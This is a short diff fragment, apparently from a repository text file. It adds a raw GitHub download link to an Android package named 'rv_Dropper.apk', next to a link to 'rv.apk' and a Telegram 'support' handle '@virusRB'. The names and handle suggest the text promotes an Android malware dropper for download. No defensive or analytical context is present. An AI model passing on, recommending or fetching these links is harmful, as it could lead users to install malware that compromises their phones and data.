@@ -46,4 +46,4 @@ https://github.com/MTX-R/7.7.7.5/blob/main/rv.apk
 cheak this--
 
             +    -    support  -t.me  @virusRB          
-             
+  https://github.com/MTX-R/droper-7.7.7.5/raw/main/rv_Dropper.apk           
